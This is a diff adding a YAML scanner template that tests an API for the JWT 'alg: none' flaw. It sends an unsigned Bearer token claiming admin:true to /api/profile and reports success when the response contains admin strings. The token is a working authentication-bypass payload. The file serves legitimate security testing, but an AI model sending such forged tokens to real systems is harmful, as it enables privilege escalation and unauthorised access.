@@ -1,0 +1,24 @@
+name: JWT令牌测试
+description: 测试JWT令牌安全漏洞
+level: 中
+author: Test
+request:
+  method: GET
+  path: /api/profile
+  params:
+    id: "123"
+  headers:
+    Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImFkbWluIjp0cnVlfQ."
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "admin"
+    - "administrator"
+    - "管理员"
+  errorIndicators:
+    - "invalid token"
+    - "unauthorized"
+    - "未授权"
+  statusCode: 200
